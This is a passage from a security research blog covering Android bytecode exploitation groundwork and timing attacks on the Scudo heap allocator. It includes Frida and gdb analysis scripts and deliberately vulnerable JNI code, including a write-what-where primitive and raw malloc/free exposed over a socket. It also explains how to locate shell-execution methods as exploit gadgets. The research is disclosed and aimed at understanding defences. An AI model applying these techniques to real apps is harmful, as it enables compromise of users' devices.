[anon:.bss] (rw-p) [0425]: 0x763343d000 - 0x7633dbd000 (offset: 0x1a18000): /system/framework/framework.jar (r--p) [0431]: 0x7635e00000 - 0x7635f54000 (offset: 0x0): /apex/com.android.art/lib64/libart.so (r--p) There are plenty of resources discussing common file types like .so and .jar. However, .art is a bit trickier. Most importantly, .art files contain heap dumps of C++ objects. Because (Java) objects are based on C++ objects on Android, this means .art may also contain (Java) objects (which they do btw).\nSo, what about the [anon:.bss]? To this day, I have no clue what this is used for, but they proved to have the following important properties:\nSome [anon:.bss] regions are in 32-bit memory. Readable and writable permissions. At least 0x1000 bytes in size. The first property is very important for object references in e.g. Java, because these are restricted to 32-bit pointers.\nFurther, the framework.jar file seems to contain the entire ART Java code and probably the standard library part like Runtime. This is important, because if an attacker is able to redirect bytecode control - flow to a chosen location, framework.jar will be gadget heaven. Hence, we will take a quick look at the internals of framework.jar.\nFramework JAR File Components It turns out that the framework.jar is just a zip archive. Unzipping using unzip reveals the following, filtered contents:\n(host)$ unzip framework.jar (host)$ ls android classes.dex classes2.dex classes3.dex classes4.dex com META-INF res Everything except for the .dex files is a directory, probably describing the structure of .jar file and what data is provided, i.e. metadata. The most interesting components are .dex files , which contain the actual code provided by the .jar file, along with types, strings and more. .dex files are also part of .apk files, i.e. apps, and contain the application - specific and some framework code. Again, whatever .dex is the current context, we will be restricted to the resources provided by that .dex file, if the goal is to stay on bytecode - level.\nTo analyse .dex files a plethora of tools is available online. Mainly, we are interested in indices into certain tables like type and method tables. To that end, one can simply use dexlib2 or Topper .\nAlthough I developed Topper for a different, now obsolete reason, its core engine still allows extracting the information needed. Basically, what can be done is the following:\n\u0026gt; file --file \u0026lt;path to .dex file\u0026gt; --type DEX classes.dex\u0026gt; list methods --regex \u0026#34;UiAutomation::executeShellCommand\u0026#34; [Offset = 0x0]: classes.dex [Index = 0x39fc, Offset = 0x25e0f0, Num Regs = 0x10]: private android/os/ParcelFileDescriptor[] android/app/UiAutomation::executeShellCommandInternal(java/lang/String command, boolean includeStderr) [Index = 0x39fb, Offset = 0x25e05c, Num Regs = 0x8]: public android/os/ParcelFileDescriptor android/app/UiAutomation::executeShellCommand(java/lang/String command) [Index = 0x39fd, Offset = 0x25e1f0, Num Regs = 0x3]: public android/os/ParcelFileDescriptor[] android/app/UiAutomation::executeShellCommandRw(java/lang/String command) [Index = 0x39fe, Offset = 0x25e20c, Num Regs = 0x3]: public android/os/ParcelFileDescriptor[] android/app/UiAutomation::executeShellCommandRwe(java/lang/String command) [Index = 0x39fb]: android/os/ParcelFileDescriptor android/app/UiAutomation::executeShellCommand(Ljava/lang/String;) [Index = 0x39fc]: android/os/ParcelFileDescriptor[] android/app/UiAutomation::executeShellCommandInternal(Ljava/lang/String;, Z) [Index = 0x39fd]: android/os/ParcelFileDescriptor[] android/app/UiAutomation::executeShellCommandRw(Ljava/lang/String;) [Index = 0x39fe]: android/os/ParcelFileDescriptor[] android/app/UiAutomation::executeShellCommandRwe(Ljava/lang/String;) Notice that loading classes.dex from framework.jar may take some time, because Topper tries to \u0026ldquo;decompile\u0026rdquo; all methods into their smali representations, all on a single thread (it was a research project btw.)! However, observe that methods are prefixed with information about their index, offset and number of used virtual registers. Some information is taken from the so - called code_item . Apparently, the .dex file contains duplicate definitions of methods, or, more likely, an abstract description and a concrete definition. When looking at methods, only consider the entries that have an offset and the number of registers set. With the above, it is apparent that framework.jar contains code that enables execution of shell commands.\nSimilar to method indices, type indices can be extracted like so:\nclasses.dex\u0026gt; list types --regex \u0026#34;android/app/UiAutomation\u0026#34; [Offset = 0x0]: classes.dex [Index = 0x599]: android/app/UiAutomation$AccessibilityEventFilter [Index = 0x59a]: android/app/UiAutomation$ConnectionState [Index = 0x59b]: android/app/UiAutomation$IAccessibilityServiceClientImpl$1$$ExternalSyntheticLambda0 [Index = 0x59c]: android/app/UiAutomation$IAccessibilityServiceClientImpl$1 [Index = 0x59d]: android/app/UiAutomation$IAccessibilityServiceClientImpl [Index = 0x59e]: android/app/UiAutomation$OnAccessibilityEventListener [Index = 0x59f]: android/app/UiAutomation ... So, one might ask why we use a tool to extract indices. In a practical setting, an attacker controlling an unprivileged app most likely does not have access to external tools like Topper. There are two perspectives to consider. First, these indices can be considered to be part of the manual component of an exploit, similar to what gadget offsets are in a simple, classical ROP chain. The other perspective is more similar to the idea of JITROP, where the app dynamically calculates the needed indices. Luckily, the latter is possible, because e.g. framework.jar is duplicated into every app process. If, however, an application - specific .dex file is required to make an exploit work, then only the first perpespective seems feasible, unless an attacker can get a hold of the target .apk file.\nAlternative: dexdump Another tool that may reveal the required information is dexdump . It seems to be available on Android devices by default, i.e. it can be run via\n(device)$ dexdump ./classes.dex | head Processing \u0026#39;./classes.dex\u0026#39;... Opened \u0026#39;./classes.dex\u0026#39;, DEX version \u0026#39;039\u0026#39; Class #0 - Class descriptor : \u0026#39;Landroid/Manifest$permission;\u0026#39; Access flags : 0x0011 (PUBLIC FINAL) Superclass : \u0026#39;Ljava/lang/Object;\u0026#39; Interfaces - Static fields - #0 : (in Landroid/Manifest$permission;) name : \u0026#39;ACCEPT_HANDOVER\u0026#39; ... Although no guarantees are made that dexdump provides the information required for exploitation, it may be easier to utilize than Topper!\nRegion Diffing Instead of comparing the memory layout of two apps over multiple app restarts or even device reboots, we can also inspect how the actual data changes, in fancy terms: region diffing. Again, we use a naive heuristic that simply compares two instances of the same memory region, each coming from a different app process (potentially the same app, just restarted), byte by byte. Because many memory regions are large, comparing two or more memory regions is time consuming. Hence, this post only considers a special region: [anon:dalvik-/system/framework/boot.art] (rw-p).\nThere are several ways to hijack bytecode control - flow on Android. One way revolves around replacing an existing, valid object with a fake object. boot.art contains heap - dumps consisting of e.g. objects and turned out to be quite reliable as regards hijacking control - flow. It is important to note that these dumped objects come from somewhere that exists before the app does, so their layouts and locations are most likely predictable. With the deterministic dalvik-main space, an attacker could try to replace an object with a fake one, but the GC often moves objects within that region, so that does not seem like a consistent, stable approach. Thus, boot.art seems like the best bet for this task.\nTo perform region diffing, we can use Frida . Similar to maps diffing, we start an app, pull its boot.art from memory and repeat. Before that, we can also ensure that boot.art is used at all. One way to do that is by simply changing the region\u0026rsquo;s permissions from rw- to ---, which should trigger a crash:\ngef➤ vmmap boot.art 0x0000006fe57000 0x000000700e5000 0x00000000000000 rw- [anon:dalvik-/system/framework/boot.art] gef➤ mprotect 0x0000006fe57000 0 gef➤ continue Thread 15 \u0026#34;Profile Saver\u0026#34; received signal SIGSEGV, Segmentation fault. Using a simple tool I wrote, we can obtain the following, interesting matching regions regarding boot.art:\n$ python3 maps_differ.py (Cmd) ... (Cmd) search maps --regex \u0026#34;.*boot.art\u0026#34; 0x6fe57000 - 0x700e5000 (offset: 0x0): [anon:dalvik-/system/framework/boot.art] (rw-p) ... (Cmd) diff region --count 4 --region-base 0x6fe57000 --names com.poc.poc_local ... Found 4010 matching blob(s). (Cmd) search blobs 0x6fe57000 - 0x6fe57e08 (size: 0xe08) 0x6fe57e09 - 0x6fe59bbc (size: 0x1db3) 0x6fe5700d - 0x6fe57012 (size: 0x5) 0x6fe57024 - 0x6fe57028 (size: 0x4) 0x6fe57034 - 0x6fe5703a (size: 0x6) ... 0x6fff9250 - 0x7003c656 (size: 0x43406) From the above results, we can see that the first 0xe08 bytes of the region remain constant over multiple runs. Furthermore, a single byte at address \u0026lt;boot.art\u0026gt; + 0xe08 seems to change over multiple runs. After the single byte, another 0x1db3 bytes are constant. Also, towards the end of boot.art seems to be a very large constant region. Therefore, and because of the fact that boot.art contains dumped objects, boot.art is a suitable candidate for semantic analysis. Note that up to this point, we only checked whether resources change over app restarts via byte - by - byte comparison. Btw. some changing resources are also interesting. For example, an object located in boot.art may change, because the GC moved a referenced object to another location.\nMonitoring Memory Accesses to boot.art The goal is to figure out what resources in boot.art are accessed by an app. Knowing that Android apps adhere to the application lifecycle , we are especially interested in resources that are accessed during inevitable events like onStop and onDestroy!\nAgain, Frida helps monitoring memory accesses in the following way:\ndef region_to_js(region): return json.dumps({ \u0026#39;addr_start\u0026#39;: region.addr_start, \u0026#39;addr_end\u0026#39;: region.addr_end }) def regions_to_js_array(regions): ar = \u0026#39;[\u0026#39; for i, region in enumerate(regions): ar += region_to_js(region) if i \u0026lt; len(regions) - 1: ar += \u0026#39;,\u0026#39; return ar + \u0026#39;] ... script = session.create_script(f\u0026#39;\u0026#39;\u0026#39; const regions = {regions_to_js_array(regions)}; console.log(JSON.stringify(regions, null, 2)); for (let region of regions) {{ const frida_region = {{base: ptr(region.addr_start), size: region.addr_end - region.addr_start}}; MemoryAccessMonitor.enable(frida_region, {{ onAccess: function(details) {{ console.log(\u0026#39;Accessed \u0026#39; + details[\u0026#39;address\u0026#39;] + \u0026#39; from: \u0026#39; + details[\u0026#39;from\u0026#39;].toString(16)); }} }}); }} \u0026#39;\u0026#39;\u0026#39;) What the above snippet does is monitor memory accesses to all regions specified in the regions list. From previous analyses, it is known that only one region is of interest, namely boot.art. With the above script and some user interaction to trigger onStop and onDestroy manually, it is possible to identify objects that are only accessed during these late lifecycle events. In my case, I found boot.art + 0x215f0, which turned out to be GRANDFATHERED . One approach to figure out the identity of an object in memory is to set an object\u0026rsquo;s klass_ pointer to null and observe the stack trace in the crash dump via logcat. GRANDFATHERED is defined in LanguageTag like so:\nclass LanguageTag { ... private static final Map\u0026lt;String, String[]\u0026gt; GRANDFATHERED = new HashMap\u0026lt;\u0026gt;(); ... public static LanguageTag parse(String languageTag, ParseStatus sts) { ... String[] gfmap = GRANDFATHERED.get(LocaleUtils.toLowerString(languageTag)); ... } } Apparently, LanguageTag.parse is invoked somewhere inside a lifecycle method, most likely onStop, because the app does not need to be terminated to trigger this method invocation. To generalize this approach, if we are able to trigger an observable event when the object of interest is used, then we can emit behaviour that specifically triggers execution of lifecycle methods. For example, onDestroy is expected to only be called on app termination. Thus, if the object is used when the app is moved to the back, then it may be that the object is used in onStop. Of course, we would have to come up with a sophisticated set of experiments to precisely determine the lifecycle method that uses an object of interest!\nUnfortunately, this story must be put on hold until the post on bytecode reuse attacks, as we only want to cover the basics in this post ;)\nSummary In this blog post, we peeked into various Android fundamentals, always driven by the goal of bytecode - based exploitation. First, bytecode basics are discussed, which lay a foundation for a follow - up discussion on weird behaviour inside bytecode. Then, a more practical view on Android\u0026rsquo;s fork server architecture is given. All major memory analysis steps used throughout this blog series are discussed.\nNext up is the first bytecode - based exploitation technique: bytecode injection!\n","permalink":"https://lolcads.github.io/posts/2024/09/bytecode_exploitation_1/","tags":["Android","Bytecode","Exploitation"],"title":"Fundamentals for Bytecode Exploitation (Part 2)"},{"categories":null,"content":"Introduction to Android Bytecode Exploitation (Part 1) Android resides among the most popular operating systems for mobile devices, which causes Android to also be among the most popular targets for exploitation. While Android is frequently updated to fix the latest CVEs, malicious actors already search for new vulnerabilities, as gaining control over millions of computationally powerful devices is very appealing. The market shares underpin that Android is by far the most lucrative platform for malicious actors targeting mobile platforms.\nLuckily, Android comes with various enforced security mechanisms. Depending on what layer is considered, there are for example the higher - level Android permission system encouraging to adhere to the principle of least privileges, and the lower - level Address Space Layout Randomization (ASLR) randomizing the layouts of process images so adversaries cannot easily predict the locations of critical code or data. Furthermore, apps are isolated from each other, which prevents malicious apps from e.g. manipulating a banking app\u0026rsquo;s internal storage. Overall, for an adversary to be \u0026ldquo;successful\u0026rdquo;, depending on the adversaries\u0026rsquo; goals, there are plenty of security mechanisms to bypass.\nThe attack surface of Android is large and consists of, among other things, the intent system and the associated binder, socket communication and app configurations. Adding to the pile, Android apps can utilize the Java Native Interface (JNI) to delegate parts of an application to the native layer, potentially increasing app performance. However, using native code, i.e. code written in memory unsafe languages like C/C++ that runs directly on the CPU, brings in the problems of that specific language. Memory unsafe languages are famous for memory corruption vulnerabilities, which would be impossible to get when writing apps only in e.g. Java. For a concrete example of a Write - What - Where (WWW) condition, consider the following sample code:\nextern \u0026#34;C\u0026#34; JNIEXPORT void JNICALL Java_\u0026lt;package_path\u0026gt;_\u0026lt;class_name\u0026gt;_\u0026lt;native_method_name\u0026gt;(JNIEnv *env, jclass clazz, jlong address, jlong value) { *(uint64_t*)address = (uint64_t)value; } This could still occur (in a more subtle way) inside a legitimate app that uses JNI. Luckily, by default Android uses security mechanisms like stack canary, NX, ASLR, Fortify, RELRO and the hardened heap allocator Scudo to name a few examples. Further, Android provides vendors with the ability to build entire components with ShadowCallStack and Control - Flow Integrity (CFI) . For a concrete example, consider the output of checksec on libart.so:\n$ ./checksec --version checksec v2.7.1, Brian Davis, github.com/slimm609/checksec.sh, Dec 2015 Based off checksec v1.5, Tobias Klein, www.trapkit.de, November 2011 $ ./checksec --file=libart.so RELRO STACK CANARY NX PIE RPATH RUNPATH\tSymbols\tFORTIFY\tFortified\tFortifiable\tFILE Full RELRO Canary found NX enabled DSO No RPATH No RUNPATH 36417 Symbols\tN/A\t0\t0\tlibart.so With all these mechanisms in place, the question we want to answer in this series of blog posts is the following:\nAssuming exploitation on native code level using techniques that directly work with native code (.*ROP, JOP, COOP, LOOP, \u0026hellip;) does not work. What exploitation techniques specific to Android are still available to an attacker trying to exploit a native - level vulnerability?\nThere is plenty of research targeting the Java - and apk - layers and IPC mechanisms. However, to the best of our knowledge, there does not seem to be any research related to bytecode - based exploitation at runtime. Of course, patching an apk - file requires (static) bytecode injection, but this is not useful if an attacker wants to exploit a vulnerability that is only exposed at runtime. Furthermore, by understanding the offensive perspective, we may be able to derive security mechanisms that prevent a particular technique (memory safe languages do not count for now!). Surprisingly, it turns out that Android app security in presence of a memory error is the minimum of the security of native code and bytecode! Below figure illustrates the idea. In other words, there are two execution models on Android, namely native and bytecode. Although each model utilizes its own mountain of security mechanisms, the total security level of an app in presence of a memory error is just as high as the smallest mountain. Thus, there is a difference between the expected and actual security in presence of a memory error, which I call security gap. For example, an attacker facing CFI and ShadowStack is likely to fail defeating the native mountain, but may succeed by conquering the bytecode mountain. Some security mechanisms have impact on both models, like ASLR and the permission system to name a few. In addition to practical security mechanisms, the defensive research community has developed a lot of strong, yet impractical solutions to prevent exploitation of memory errors.\nNow, one may raise the question about practicality . Are there even apps that use JNI and vulnerable native - level functions? According to Almanee et al. , Android apps use a plethora of native - level libraries. Furthermore, it is shown that updating vulnerable libraries takes a considerable amount of time, meaning that adversaries have a good chance to successfully exploit a bug in an app using a library with a known CVE. Also, Borzacchiello et al. show that vulnerable native functions can often be reached from the Java side. With both studies combined, we gain the privilege to focus solely on exploitation of an assumed vulnerability, because vulnerabilities are known to be patched slowly and to be reachable. However, apps rarely state that they are affected by a vulnerability in one of their native libraries, which is why we skip over the hunt for a real - world vulnerability for now. If we show that exploitation of a native - level vulnerability (like stack - buffer overflow) using only bytecode is possible, then this means that exploitability of all apps using vulnerable libraries must be reconsidered. This stems from the fact that bytecode - based exploitation is not expected to be mitigated by native - level exploit mitigations. For a concrete example, even though ROP may be (almost) impossible to use to exploit a stack - buffer overflow without executable pointer leak, orthogonally, bytecode injection may very well be applicable.\nOverall, the following topics are covered by individual blog posts:\nIntroduction (this post): Gives an overview over the test environment, test device, resources used during research and some tips for (dynamic) Android app analysis. Android Process Fundamentals : Shows how bytecode execution is kicked off in Android 13, what common libraries reside in every App and how Java (JNI) methods are invoked. Also, some more advanced app analysis techniques are discussed. Bytecode Injection : First exploitation technique shows a major flaw in the design of (probably any) interpreter: data = code. A first PoC using bytecode injection, where e.g. ROP seems impossible, is discussed in detail. Bytecode Reuse : Second exploitation technique shows that solving the first flaw will not help, because (byte-)code reuse attacks are possible again. This is a very advanced and specific technique based on the ideas of COOP and insecure deserialization . Of course, there is an associated github repository that contains all PoCs, deliberately vulnerable apps and more.\nNotice that bytecode exploitation on Android as of writing is very tricky, requiring knowledge that seems out - of - place when talking about native - level exploitation. The goal of every PoC will be arbitrary command execution in the context of the vulnerable app. However, I claim that an attacker can fully take over the target app, including its privileges. Also, it may be that some observations about Android are sprinkled into the posts.\nBefore delving into the details, the setup must be discussed. Also, some information on the disclosure process is given.\nResponsible Disclosure All research results, including working PoCs, have been submitted to Google\u0026rsquo;s bug bounty program to ensure that publishing these blog posts does not cause any severe security problems and to give Google time to investigate the findings and respond, if necessary. Of course, there are no concrete vulnerabilities, but rather a new exploitation concept on Android. Also, I find it hard to estimate the practical impact of these blog posts, because many stars must align for bytecode injection and reuse to work, which is why I welcomed the feedback. Fortunately, Google decided the results are not a security concern and gave permission to publish blog posts on that matter!\nTest Environment Everything discussed in this series of blog posts has been thoroughly tested on a rooted Google Pixel 7, with build number TQ3A.230901.001.C2. This boils down to tag android-13.0.0_r78. The only reason the device is rooted is that it simplifies using gdb and frida-server.\nFurthermore, we build deliberately vulnerable apps that expose their vulnerabilities via a simple network interface based on ServerSocket and Socket. These apps are built in release mode using default configurations of Android Studio (version: 2023.2.1 Patch 1 (Build #AI-232.10300.40.2321.11567975)), working with the assumption that the principle of security by default is followed thoroughly in Android Studio.\nAnalysis Setup With a rooted Pixel 7, USB debugging is used to get a shell on the device via adb . Assuming the device is connected to a host, adb is set up and USB - debugging is enabled, run:\n(host)$ adb shell (device)$ su (device)# to obtain a root shell.\nFurthermore, gdbserver or frida-server are used to attach to a target app for detailed dynamic analysis. Luckily, there exists the /data/local/tmp directory, which is world - readable and - writeable. Using adb push \u0026lt;host file name\u0026gt; /data/local/tmp/\u0026lt;file name\u0026gt; allows moving e.g. gdbserver to the device. In turn, this enables debugging apps.\nNote: Another interesting, world - readable file is /data/misc/shared_relro/libwebviewchromium64.relro . This contains actual virtual addresses used by apps that utilize WebView. At first glance, an unprivileged app does not gain anything from reading this file, because Android\u0026rsquo;s fork server architecture shares such information anyways.\nDebugging Android Apps To gain a deep understanding of control flow at runtime, especially during execution of an exploit, gdb is used. To be precise, gef is used, but this is personal preference. Associated with gdb is gdbserver , which allows attaching to a running process, like an app, based on the app\u0026rsquo;s pid. To figure out the pid of e.g. \u0026quot;youtube\u0026quot;, run the following commands:\n(devive)$ pm list packages youtube package:com.google.android.youtube # \u0026lt;--- probably this one package:com.google.android.apps.youtube.music (device)$ pidof com.google.android.youtube # not running (device)$ pidof com.google.android.youtube 11287 Combining this with gdb yields the following command for attaching to the target app:\n(device)# /data/local/tmp/gdbserver :1337 --attach $(pidof \u0026lt;name of app\u0026gt;) To connect gdb to gdbserver running on the device, the debug port must be forwarded:\n(host)$ adb forward tcp:1337 tcp:1337 Before we can start debugging, it may be useful to get some symbol information. To that end, identify what libraries are relevant for the current task, use adb pull to pull them into a directory, say dbgtmp, and run:\n(device)$ gdb-multiarch -q gef➤ set solib-search-path ./dbgtmp/ gef➤ set solib-absolute-prefix ./dbgtmp/ Now, gdb knows where to look for symbols while debugging.\nAt last, gdb can connect to the server\ngef➤ target extended-remote :1337 gef➤ sharedlibrary These may seem like a lot of steps, but it is worth it!\nAbout lldb Of course, it is also possible to use lldb to debug an app. For example, one can utilize Android Studio\u0026rsquo;s integrated native debugging based on lldb to debug apps. lldb does a great job at resolving symbols, but there seems to be a lack of plugins. For example, I use gef for debugging Android apps, which comes with features like memory search and hexdumping. That being said, lldb is (hopefully) sematically equivalent to gdb and its plugins. It does not matter what debugger is used, but I prefer gdb.\nInstrumentation via Frida While debugging can also be automated, it is somewhat inefficient and does not always provide the features needed for dynamic analysis. For example, finding the representation of the java.lang.Class object seems like a daunting task when only equipped with a debugger. This is where frida comes to the rescue. Unfortunately, frida is too complex to fit a tutorial into this series of blog posts.\nTo get frida up and running, utilize frida-server :\n(host)$ adb push frida-server /data/local/tmp/frida-server (host)$ adb shell (device)$ su (device)# /data/local/tmp/frida-server Now, to attach to some process based on the pid, use the following python code\nimport frida device = frida.get_usb_device() session = device.attach(\u0026lt;pid\u0026gt;) script = session.create_script(f\u0026#39;\u0026#39;\u0026#39; for (let i = 0; i \u0026lt; 10; i++) {{ console.log(\u0026#34;Hijacked {pid}\u0026#34;); }} \u0026#39;\u0026#39;\u0026#39;) def on_message(message, data): if message[\u0026#39;type\u0026#39;] == \u0026#39;send\u0026#39;: print(f\u0026#39;{message[\u0026#39;payload\u0026#39;]}\u0026#39;) else: print(f\u0026#39;Something went wrong: {message[\u0026#34;description\u0026#34;]}\u0026#39;) print(message[\u0026#39;stack\u0026#39;]) script.on(\u0026#39;message\u0026#39;, on_message) script.load() It may be beneficial to use format strings for setting up the js script to run inside the target app, e.g. to set a default block size for memory dumping.\nResources The main resource, the foundation of all this research, is the source code of the Android Runtime (ART) . However, a lot of knowledge has been generated from simply testing hypotheses, days of debugging and trying to make as many cross - references to already well - known topics as possible. For example, having some knowledge on COOP attacks allowed me to come up with the technique for bytecode reuse. This is why some statements made throughout this series are without a concrete reference.\nConclusion In this blog post, we laid some groundwork for understanding bytecode - based exploitation on Android. Most importantly, we discussed the execution environment and how to set up gdb and frida. The next post will be a deep dive into various Android components, especially the fork server architecture and its implications for Android apps!\n","permalink":"https://lolcads.github.io/posts/2024/09/bytecode_exploitation_0/","tags":["Android","Bytecode","Exploitation"],"title":"Introduction to Android Bytecode Exploitation (Part 1)"},{"categories":null,"content":"Attempting Timing Attacks against Scudo In this second blog post we will take a different approach for attacking Scudo , i.e. we will try to the measure execution times for calls to malloc and hope to be able to derive a portion of the internal state of the allocator (i.e. perform side channel attacks). The version of Scudo considered in this blog post is 161cca266a9d0b6deb5f1fd2de8ad543649a7fa1 .\nThere will be almost only negative results (which means I unfortunately could not make it work), except for one. The main conclusion we can draw from this post is that Scudo is not designed to mitigate timing attacks! This follows from trying to leak a piece of information and then accidentally leaking a different and unclassified piece.\nDisclaimer: The following analyses can be incomplete and/or incorrect. Also the experiments conducted are on a very basic level compared to the complex field of Data Science. The style of this post is informal and chosen based on the idea of practical attacks on Android.\nExperimental Setup As usual, there is a module for the damnvulnerableapp of the form:\nJNIEXPORT jbyteArray JNICALL Java_com_damnvulnerableapp_vulnerable_modules_HeapSCAModule_handleMessage(JNIEnv *env, jclass class, jbyteArray message) { uint32_t length = (*env)-\u0026gt;GetArrayLength(env, message); if (length == 0) return NULL; jbyte *raw = (*env)-\u0026gt;GetByteArrayElements(env, message, NULL); if (raw) { jbyteArray result = (*env)-\u0026gt;NewByteArray(env, 8); switch (raw[0]) { case 0: { // Malloc uint64_t size = *((uint64_t*)\u0026amp;raw[1]); uint8_t *ptr; ptr = malloc(size); (*env)-\u0026gt;SetByteArrayRegion(env, result, 0, 8, (jbyte*)\u0026amp;ptr); break; } case 1: { // Free uint8_t *ptr = (uint8_t*)(*(uint64_t*)\u0026amp;raw[1]); free(ptr); (*env)-\u0026gt;SetByteArrayRegion(env, result, 0, 8, (jbyte*)\u0026amp;ptr); break; } } return result; } return NULL; } This module lets the user directly control whether and how to call malloc and free, or, to be more precise, Allocator::allocate and Allocator::deallocate . The input is composed like this: \u0026lt;func id\u0026gt;\u0026lt;size | ptr\u0026gt; (9 bytes).\ndamnvulnerableapp is run in an x86-64 emulator (Pixel 3) running Android 12 and forwards remote user requests to the above module. It is already expected to see a lot of timing noise based on this setup.\nNotice that measuring execution time of a remote call to e.g. malloc(0x10) (primary allocation) will actually measure execution time of a call to Java_com_damnvulnerableapp_vulnerable_modules_HeapSCAModule_handleMessage, which is called from Java.\nAs regards the client used to communicate with the app, it is written in C, thus it is expected to run faster than the former Python client. Because damnvulnerableapp uses a request - response model, i.e. a client has to request e.g. malloc(0x10), gets a response that the request \u0026ldquo;worked\u0026rdquo; and then has to fetch the result with a second request, the time measurements are conducted as follows:\nstruct timespec before; struct timespec after; ... // Request malloc(0x10) app_forward(fd, (uint8_t*)message, 9, \u0026amp;buffer, \u0026amp;buffer_length, \u0026amp;before); // Free response buffer free(buffer); // Request result of malloc(0x10) app_fetch(fd, \u0026amp;buffer, \u0026amp;buffer_length, \u0026amp;after); // Extract result from response pointer = *(uint64_t*)get_content(buffer, buffer_length); // Free response buffer free(buffer); ... app_fetch and app_forward (internally call app_send_formatted) are the core of this client:\nenum error_code app_fetch(...) { ... result = app_send_formatted(fd, \u0026#34;CONTENT\u0026#34;, \u0026#34;FETCH\u0026#34;, (uint8_t*)\u0026#34;\u0026#34;, 0, NULL); if (result != error_success) { log_error(\u0026#34;Failed to forward buffer\u0026#34;); return result; } result = app_full_read(fd, buffer, buffer_size); if (result != error_success) { log_error(\u0026#34;Failed to read response to forward\u0026#34;); return result; } // Measure time after fetching result if (after_receive != NULL) clock_gettime(CLOCK_THREAD_CPUTIME_ID, after_receive); ... } enum error_code app_send_formatted(...) { ... // Measure time before forwarding message if (before_send != NULL) clock_gettime(CLOCK_THREAD_CPUTIME_ID, before_send); result = app_full_write(fd, buffer, buffer_size + content_length); free(buffer); if (result != error_success) { log_error(\u0026#34;Failed to send request\u0026#34;); return result; } ... } Because of the request - response model, there is additional noise introduced by being forced to make two remote requests for one e.g. malloc(0x10)!\nLets again summarize expected sources of noise introduced by the experimental setup:\nAndroid OS is emulated and therefore does not behave like an Android OS running on a \u0026ldquo;real\u0026rdquo; device (e.g. in terms of CPU power and scheduling) Remote access to damnvulnerableapp. Although the emulator that runs the app is launched within the same device we will perform the measurements with, this is an additional layer of indirection. Call to e.g. malloc is actually a call to handleMessage, which has to be invoked from Java. The call stack is pretty deep\u0026hellip; Two requests per operation Timing Attacks In this section, timing attacks on different targets within Scudo will be discussed.\nAttacking Chunks Array The core idea is to abuse a timing side channel on Allocator::allocate, i.e. calling malloc in damnvulnerableapp. C-\u0026gt;Count will be the target of the attack, i.e. based on the measured execution times, we try to estimate the value of C-\u0026gt;Count.\nOne may ask, why C-\u0026gt;Count is interesting. There are two reasons:\nThe chunk arrays are shuffled to, among other things, prevent an attacker from predicting where the next allocated chunk will be located. E.g. this can prevent heap overflows. Knowing C-\u0026gt;Count looks like the first natural step to predicting how the array looks like in terms of address ordering. SizeClassAllocatorLocalCache::allocate contains a classical pattern for a timing side channel: void *allocate(uptr ClassId) { ... PerClass *C = \u0026amp;PerClassArray[ClassId]; if (C-\u0026gt;Count == 0) { // If C-\u0026gt;Count = 0, then execution time is longer than \u0026#34;usual\u0026#34; ... refill(C, ClassId); ... } // The rest is very fast ... CompactPtrT CompactP = C-\u0026gt;Chunks[--C-\u0026gt;Count]; ... return Allocator-\u0026gt;decompactPtr(ClassId, CompactP); } When allocating memory from the primary allocator via e.g. malloc(0x10), then there is a number of allocations that will result in triggering C-\u0026gt;Count == 0 , which again triggers execution of refill . Afterwards, assuming that batches are only pushed back through drain or are newly allocated via map , we can distinguish the following cases for C-\u0026gt;Count:\nC-\u0026gt;Count = C-\u0026gt;MaxCount / 2 . This stems from the fact that deallocate can create batches if the corresponding Chunks array is full. To be precise, this will trigger the execution of drain , where C-\u0026gt;Count = C-\u0026gt;MaxCount. Therefore the minimum Count = Min(C-\u0026gt;MaxCount / 2, C-\u0026gt;Count) in drain will evaluate to 0 \u0026lt; C-\u0026gt;MaxCount / 2 \u0026lt; C-\u0026gt;MaxCount. Finally, C-\u0026gt;Count -= Count \u0026lt;=\u0026gt; C-\u0026gt;Count = C-\u0026gt;MaxCount - C-\u0026gt;MaxCount / 2 = C-\u0026gt;MaxCount / 2. Notice that C-\u0026gt;MaxCount = 2 * TransferBatch::getMaxCached(Size) . As can be seen in the next step, for malloc(0x10), this will result in C-\u0026gt;MaxCount = 2 * 13 = 26 =\u0026gt; C-\u0026gt;Count = 26 / 2 = 13. C-\u0026gt;Count = MaxCount , i.e.: C-\u0026gt;Count = MaxCount = TransferBatch::getMaxCached(Size) = Min(MaxNumCached, SizeClassMap::getMaxCachedHint(Size)) = Min(13, Max(1U, Min(Config::MaxNumCachedHint, N))) = Min(13, Max(1U, Min(13, (1U \u0026lt;\u0026lt; Config::MaxBytesCachedLog) / static_cast\u0026lt;u32\u0026gt;(Size)))) = Min(13, Max(1U, Min(13, (1U \u0026lt;\u0026lt; 13) / Classes[ClassId - 1]))) where Classes :\nstatic constexpr u32 Classes[] = { 0x00020, 0x00030, 0x00040, 0x00050, 0x00060, 0x00070, 0x00080, 0x00090, 0x000a0, 0x000b0, 0x000c0, 0x000e0, 0x000f0, 0x00110, 0x00120, 0x00130, 0x00150, 0x00160, 0x00170, 0x00190, 0x001d0, 0x00210, 0x00240, 0x002a0, 0x00330, 0x00370, 0x003a0, 0x00400, 0x00430, 0x004a0, 0x00530, 0x00610, 0x00730, 0x00840, 0x00910, 0x009c0, 0x00a60, 0x00b10, 0x00ca0, 0x00e00, 0x00fb0, 0x01030, 0x01130, 0x011f0, 0x01490, 0x01650, 0x01930, 0x02010, 0x02190, 0x02490, 0x02850, 0x02d50, 0x03010, 0x03210, 0x03c90, 0x04090, 0x04510, 0x04810, 0x05c10, 0x06f10, 0x07310, 0x08010, 0x0c010, 0x10010, }; So for a small allocation, i.e. for ClassId = 1, we get:\nC-\u0026gt;Count = Min(13, Max(1U, Min(13, 0x2000 / 0x20))) = Min(13, Max(1U, Min(13, 256))) = Min(13, Max(1U, 13)) = 13 Notice that C-\u0026gt;Count = MaxCount is true for all batches added to FreeList except for the last one, because N depends on a minimum:\nfor (u32 I = 0; I \u0026lt; NumberOfBlocks;) { TransferBatch *B = C-\u0026gt;createBatch(ClassId, reinterpret_cast\u0026lt;void *\u0026gt;(decompactPtrInternal( CompactPtrBase, ShuffleArray[I]))); if (UNLIKELY(!B)) return nullptr; const u32 N = Min(MaxCount, NumberOfBlocks - I); // If (NumberOfBlocks - I \u0026lt; MaxCount) =\u0026gt; last iteration B-\u0026gt;setFromArray(\u0026amp;ShuffleArray[I], N); Region-\u0026gt;FreeList.push_back(B); I += N; } Single - Threaded Timing - Based Side Channel Attack on Primary Assuming that the only thread that accesses the Scudo primary for allocations of the form malloc(0x10) can be convinced to run this allocation with a constant, computable overhead. Then, the following attack might enable the prediction of C-\u0026gt;Count based on measures of elapsed time:\nIn iteration j perform 13 allocations (assuming 